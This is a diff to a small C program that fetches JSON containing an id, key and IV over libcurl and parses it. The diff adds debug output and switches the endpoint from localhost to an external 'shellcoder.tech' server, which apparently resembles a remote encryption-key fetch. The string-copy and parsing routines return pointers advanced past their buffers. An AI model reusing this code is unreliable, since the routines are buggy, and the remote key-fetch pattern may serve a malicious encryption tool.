@@ -41,8 +41,9 @@ size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s)
 }
 
 char * _strncpy(char * string, int start, int end){
-	char * return_val = malloc(sizeof(char) *(end-start));
+	char * return_val = malloc(sizeof(char) *(end-start+1));
 	int i = 0;
+	printf("Starting _strncpy\n");
 
 	for (i = start; i < end; i ++)
 	{
@@ -50,10 +51,10 @@ char * _strncpy(char * string, int start, int end){
 		*return_val = string[i];
 		*return_val++;
 	}
-
+	
 	*return_val = '\0';
 
-	printf("%s",return_val);
+	printf("\nreturn val: %s\n",return_val);
 	return return_val;
 
 }
@@ -61,12 +62,15 @@ char * _strncpy(char * string, int start, int end){
 //returns id, key, iv
 char ** parseJson(char * string, int len) 
 {
-	printf("%s\n",string);
-	int i = 0;
+	printf("%s\n\n",string);
+	int i = 0, counted =0;
 	char ** return_val = malloc(sizeof(char*)*3);
 
 	for(i = 4; i < len; i ++)
 	{
+		if(counted == 2) {
+			break;
+		}
 		if(string[i] == ':')
 		{
 			i = i + 2;
@@ -75,12 +79,13 @@ char ** parseJson(char * string, int len)
 			while(string[j] != '"') {
 				j++;
 			}
-
-			*return_val = _strncpy(string,i,j+1);
+			counted ++;
+			*return_val = _strncpy(string,i,j);
+			printf("return_val : %s\n",*return_val);
 			*return_val++;
 		}
 	}
-
+	printf("\n========================\n");
 	return return_val;
 
 }
@@ -98,7 +103,7 @@ int main (int argc, char ** argv)
 
 	curl = curl_easy_init();
 	if(curl) {
-		curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:8080/sendEncrypt");
+		curl_easy_setopt(curl, CURLOPT_URL, "http://shellcoder.tech/sendEncrypt");
 		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
 		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
 		//curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
